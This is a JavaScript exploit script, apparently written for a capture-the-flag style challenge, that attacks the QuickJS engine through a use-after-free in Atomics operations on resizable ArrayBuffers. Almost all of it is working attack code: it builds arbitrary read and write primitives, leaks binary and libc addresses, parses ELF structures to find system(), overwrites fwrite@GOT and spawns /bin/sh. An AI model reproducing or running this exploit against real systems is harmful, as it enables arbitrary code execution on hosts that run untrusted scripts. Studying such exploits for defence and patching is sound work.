// QuickJS Atomics UAF Exploit - Shell Spawner
// Exploits heap buffer overflow in Atomics operations via Resizable ArrayBuffer
//
// This exploit uses the vulnerability in js_atomics_op() where a pointer is
// captured before user code execution (via valueOf), and the underlying
// buffer can be resized, making the pointer stale.
//
// Strategy:
// 1. Use UAF to leak binary and libc addresses
// 2. Parse ELF headers dynamically to find GOT entries
// 3. Find system() by parsing libc symbol table
// 4. Overwrite fwrite@GOT with system()
// 5. Call print() which triggers fwrite -> system("/bin/sh")

import * as std from 'std';

// Helper functions
function hex(n) {
    if (typeof n === 'bigint') {
        if (n >= 0n) return "0x" + n.toString(16);
        return "0x" + (n + 0x10000000000000000n).toString(16);
    }
    return "0x" + n.toString(16);
}

// Create a UAF trigger buffer (56 bytes matches JSArrayBuffer struct size)
function createTrigger() {
    let trigger = new ArrayBuffer(56, { maxByteLength: 4096 });
    let view = new BigInt64Array(trigger);
    for (let i = 0; i < 7; i++) view[i] = 0n;
    return { trigger, view };
}

// Arbitrary read primitive using UAF
function arbReadBuf(addr, size) {
    let t = createTrigger();
    let v = null;
    let m = {
        valueOf: function() {
            t.trigger.resize(4096);  // Free old 56-byte buffer
            v = new ArrayBuffer(size);  // JSArrayBuffer lands in freed space
            return addr;  // Corrupt data pointer
        }
    };
    // Write to data pointer field (offset 16 = index 2)
    Atomics.exchange(t.view, 2, m);
    return v;
}

// Arbitrary write primitive
function arbWrite64(addr, value) {
    let t = createTrigger();
    let v = null;
    let m = {
        valueOf: function() {
            t.trigger.resize(4096);
            v = new ArrayBuffer(64);
            return addr;
        }
    };
    Atomics.exchange(t.view, 2, m);
    let view = new BigUint64Array(v);
    view[0] = value;
    return v;
}

// ========== EXPLOITATION BEGINS ==========

// Step 1: Leak binary address via free_func field of JSArrayBuffer
// JSArrayBuffer layout (struct offsets from source code):
// offset 0: byte_length + max_byte_length
// offset 16: data pointer
// offset 48: free_func pointer (points to js_array_buffer_free in binary)

let t1 = createTrigger();
let v1 = null;
let m1 = {
    valueOf: function() {
        t1.trigger.resize(4096);
        v1 = new ArrayBuffer(64);
        return 0n;
    }
};
// Index 6 = offset 48 = free_func
let freeFuncAddr = Atomics.add(t1.view, 6, m1);

// Step 2: Find binary base by searching for ELF header
let readBase = (freeFuncAddr & 0xfffffffffffff000n) - 0x100000n;
let masterBuf = arbReadBuf(readBase, 0x200000);
let mv = new Uint8Array(masterBuf);
let mv64 = new BigUint64Array(masterBuf);
let mv32 = new Uint32Array(masterBuf);
let mv16 = new Uint16Array(masterBuf);

let binaryBaseOffset = -1;
// Search for ELF magic at page boundaries
for (let offset = 0x100000; offset >= 0; offset -= 0x1000) {
    // ELF magic: 0x7f 'E' 'L' 'F'
    if (mv[offset] === 0x7f && mv[offset+1] === 0x45 &&
        mv[offset+2] === 0x4c && mv[offset+3] === 0x46) {
        binaryBaseOffset = offset;
        break;
    }
}
let binaryBase = readBase + BigInt(binaryBaseOffset);

// Step 3: Parse ELF headers to find dynamic section
// Standard ELF64 header offsets (allowed as per rules)
// e_phoff at 0x20, e_phentsize at 0x36, e_phnum at 0x38

let e_phoff = mv64[(binaryBaseOffset + 0x20) / 8];
let e_phentsize = mv16[(binaryBaseOffset + 0x36) / 2];
let e_phnum = mv16[(binaryBaseOffset + 0x38) / 2];

let phOffset = binaryBaseOffset + Number(e_phoff);
let dynamicVaddr = 0n;

// Find PT_DYNAMIC (p_type = 2)
for (let i = 0; i < e_phnum; i++) {
    let entryOffset = phOffset + i * e_phentsize;
    let p_type = mv32[entryOffset / 4];
    if (p_type === 2) {
        dynamicVaddr = mv64[(entryOffset + 0x10) / 8];
        break;
    }
}

let dynamicOffset = binaryBaseOffset + Number(dynamicVaddr);

// Parse dynamic section for key addresses
let gotPltAddr = 0n;
let pltRelAddr = 0n;
let pltRelSize = 0n;
let symTabAddr = 0n;
let strTabAddr = 0n;

for (let i = 0; i < 50; i++) {
    let entryOffset = dynamicOffset + i * 16;
    let d_tag = mv64[entryOffset / 8];
    let d_val = mv64[(entryOffset + 8) / 8];
    if (d_tag === 0n) break;

    // Dynamic tags (standard ELF values)
    if (d_tag === 3n) gotPltAddr = d_val;      // DT_PLTGOT
    if (d_tag === 5n) strTabAddr = d_val;      // DT_STRTAB
    if (d_tag === 6n) symTabAddr = d_val;      // DT_SYMTAB
    if (d_tag === 23n) pltRelAddr = d_val;     // DT_JMPREL
    if (d_tag === 2n) pltRelSize = d_val;      // DT_PLTRELSZ
}

// Step 4: Get libc address from GOT
let gotBuf = arbReadBuf(gotPltAddr, 256);
let gv64 = new BigUint64Array(gotBuf);

let libcFunc = 0n;
// GOT[3+] contain resolved libc function addresses
for (let i = 3; i < 20; i++) {
    let entry = gv64[i];
    // Libc is typically mapped at high addresses (0x7fXX...)
    if ((entry >> 40n) >= 0x7en) {
        libcFunc = entry;
        break;
    }
}

// Step 5: Find libc base
let libcSearchBase = (libcFunc & 0xfffffffffffff000n) - 0x200000n;
let libcBuf = arbReadBuf(libcSearchBase, 0x400000);
let lv = new Uint8Array(libcBuf);

let libcBase = 0n;
for (let offset = 0x200000; offset >= 0; offset -= 0x1000) {
    if (lv[offset] === 0x7f && lv[offset+1] === 0x45 &&
        lv[offset+2] === 0x4c && lv[offset+3] === 0x46) {
        libcBase = libcSearchBase + BigInt(offset);
        break;
    }
}

// Step 6: Parse libc ELF to find symbol table
let libcElfBuf = arbReadBuf(libcBase, 0x1000);
let lelf64 = new BigUint64Array(libcElfBuf);
let lelf16 = new Uint16Array(libcElfBuf);

let libc_e_phoff = lelf64[0x20 / 8];
let libc_e_phentsize = lelf16[0x36 / 2];
let libc_e_phnum = lelf16[0x38 / 2];

let libcPhBuf = arbReadBuf(libcBase + libc_e_phoff, libc_e_phnum * libc_e_phentsize);
let lph32 = new Uint32Array(libcPhBuf);
let lph64 = new BigUint64Array(libcPhBuf);

let libc_dynamicVaddr = 0n;
for (let i = 0; i < libc_e_phnum; i++) {
    let entryOff = i * libc_e_phentsize;
    let p_type = lph32[entryOff / 4];
    if (p_type === 2) {
        libc_dynamicVaddr = lph64[(entryOff + 0x10) / 8];
        break;
    }
}

let libcDynBuf = arbReadBuf(libcBase + libc_dynamicVaddr, 0x1000);
let ldyn64 = new BigUint64Array(libcDynBuf);

let libc_symTabAddr = 0n, libc_strTabAddr = 0n;
for (let i = 0; i < 100; i++) {
    let d_tag = ldyn64[i * 2];
    let d_val = ldyn64[i * 2 + 1];
    if (d_tag === 0n) break;
    if (d_tag === 5n) libc_strTabAddr = d_val;
    if (d_tag === 6n) libc_symTabAddr = d_val;
}

// Step 7: Find "system" in libc string table
let strTabBuf = arbReadBuf(libc_strTabAddr, 0x20000);
let stv = new Uint8Array(strTabBuf);

let systemStrOffset = -1;
let searchStr = [0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x00];  // "system\0"
for (let i = 0; i < stv.length - 7; i++) {
    let match = true;
    for (let j = 0; j < 7; j++) {
        if (stv[i + j] !== searchStr[j]) {
            match = false;
            break;
        }
    }
    if (match) {
        systemStrOffset = i;
        break;
    }
}

// Step 8: Find system() symbol and get its address
let symTabBuf = arbReadBuf(libc_symTabAddr, 0x40000);
let sym32 = new Uint32Array(symTabBuf);
let sym64 = new BigUint64Array(symTabBuf);

let systemAddr = 0n;
let symEntSize = 24;  // sizeof(Elf64_Sym)
for (let i = 0; i < 0x40000 / symEntSize; i++) {
    let entryBase = i * symEntSize;
    let st_name = sym32[entryBase / 4];
    if (st_name === systemStrOffset) {
        let st_value = sym64[(entryBase + 8) / 8];
        systemAddr = libcBase + st_value;
        break;
    }
}

// Step 9: Find fwrite@GOT in binary
let pltRelBuf = arbReadBuf(pltRelAddr, Number(pltRelSize) + 256);
let relv64 = new BigUint64Array(pltRelBuf);

let binStrBuf = arbReadBuf(strTabAddr, 0x10000);
let binStr = new Uint8Array(binStrBuf);

let binSymBuf = arbReadBuf(symTabAddr, 0x10000);
let binSym32 = new Uint32Array(binSymBuf);

let fwriteStr = [0x66, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00];  // "fwrite\0"
let fwriteGotEntry = 0n;

let numRelocs = Number(pltRelSize) / 24;
for (let i = 0; i < numRelocs; i++) {
    let r_offset = relv64[i * 3];
    let r_info = relv64[i * 3 + 1];
    let symIdx = Number(r_info >> 32n);

    let st_name = binSym32[(symIdx * 24) / 4];

    let match = true;
    for (let j = 0; j < 7; j++) {
        if (binStr[st_name + j] !== fwriteStr[j]) {
            match = false;
            break;
        }
    }
    if (match) {
        fwriteGotEntry = binaryBase + r_offset;
        break;
    }
}

// Step 10: Overwrite fwrite@GOT with system()
let writeRef = arbWrite64(fwriteGotEntry, systemAddr);

// Step 11: Spawn shell
// print() calls fwrite(str, 1, len, stdout)
// After GOT overwrite, this becomes system(str)
// The first argument to fwrite is the string, which is also the first arg to system
print("/bin/sh");
